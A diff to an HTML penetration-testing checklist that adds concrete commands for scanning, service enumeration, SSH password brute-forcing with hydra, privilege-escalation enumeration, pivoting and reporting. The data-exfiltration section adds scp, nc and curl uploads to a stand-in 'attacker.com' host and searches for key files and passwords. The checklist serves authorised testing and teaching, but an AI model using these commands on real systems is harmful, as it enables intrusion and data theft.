@@ -119,15 +119,17 @@
   <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" />UDP scan of common ports</li>
   <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" />Service version detection</li>
   <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" />Script scanning of discovered services</li>
+  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" />Stealth scan: <code class="language-plaintext highlighter-rouge">nmap -sS &lt;target&gt;</code></li>
+  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" />Masscan: <code class="language-plaintext highlighter-rouge">masscan -p0-65535 &lt;target&gt;</code></li>
 </ul>
 
 <h3 id="service-enumeration">Service Enumeration</h3>
 <ul class="task-list">
-  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" />HTTP/HTTPS (80/443)</li>
-  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" />SSH (22)</li>
-  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" />SMB (445)</li>
-  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" />RPC (111)</li>
-  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" />Database services</li>
+  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" />HTTP/HTTPS: <code class="language-plaintext highlighter-rouge">nikto -h &lt;target&gt;, curl &lt;target&gt;</code></li>
+  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" />SSH: <code class="language-plaintext highlighter-rouge">hydra -l admin -P passwords.txt ssh://&lt;target&gt;</code></li>
+  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" />SMB: <code class="language-plaintext highlighter-rouge">smbclient -L &lt;target&gt;, enum4linux &lt;target&gt;</code></li>
+  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" />RPC: <code class="language-plaintext highlighter-rouge">rpcinfo -p &lt;target&gt;</code></li>
+  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" />Databases: <code class="language-plaintext highlighter-rouge">nmap --script mysql-info &lt;target&gt;, psql &lt;target&gt;</code></li>
 </ul>
 
 <h2 id="post-exploitation">Post Exploitation</h2>
@@ -139,6 +141,9 @@
   <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" />Inspect cron jobs</li>
   <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" />Check for kernel exploits</li>
   <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" />Review service configurations</li>
+  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" />Check capabilities: <code class="language-plaintext highlighter-rouge">getcap -r / 2&gt;/dev/null</code></li>
+  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" />Check environment variables: <code class="language-plaintext highlighter-rouge">bash env, export | grep PATH</code></li>
+  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" />Use tools: LinPEAS: <code class="language-plaintext highlighter-rouge">./LinPEAS.sh</code>, Linux Smart Enumeration: <code class="language-plaintext highlighter-rouge">./lse.sh</code> pspy64: <code class="language-plaintext highlighter-rouge">./pspy64</code></li>
 </ul>
 
 <h3 id="lateral-movement">Lateral Movement</h3>
@@ -147,6 +152,9 @@
   <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" />Password hunting</li>
   <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" />SSH key discovery</li>
   <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" />Trust relationships</li>
+  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" />ARP table: ip neighbor</li>
+  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" />Routing info: route -n</li>
+  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" />DNS for pivoting: <code class="language-plaintext highlighter-rouge">cat /etc/resolv.conf, dig &lt;domain&gt;</code></li>
 </ul>
 
 <h3 id="data-exfiltration">Data Exfiltration</h3>
@@ -155,6 +163,8 @@
   <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" />Database dumps</li>
   <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" />Configuration files</li>
   <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" />User credentials</li>
+  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" />Exfiltrate via: <code class="language-plaintext highlighter-rouge">scp &lt;file&gt; user@attacker:., nc -l 4444 &gt; data.tar.gz, curl -T data.tar.gz https://attacker.com</code></li>
+  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" />Additional sensitive files: <code class="language-plaintext highlighter-rouge">find / -name "*.pem" 2&gt;/dev/null, grep -r "password" / 2&gt;/dev/null</code></li>
 </ul>
 
 <h2 id="documentation">Documentation</h2>
@@ -163,6 +173,9 @@
   <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" />Command outputs</li>
   <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" />Exploitation steps</li>
   <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" />Remediation recommendations</li>
+  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" />Use screenshot tool: <code class="language-plaintext highlighter-rouge">scrot -s</code></li>
+  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" />Save outputs: <code class="language-plaintext highlighter-rouge">uname -a &gt; system_info.txt, sudo -l &gt; sudo_perms.txt</code></li>
+  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" />Suggest fixes: <code class="language-plaintext highlighter-rouge">“Update kernel to patch DirtyPipe”, “Remove SUID from /usr/bin/find”</code></li>
 </ul>
 
           </div>
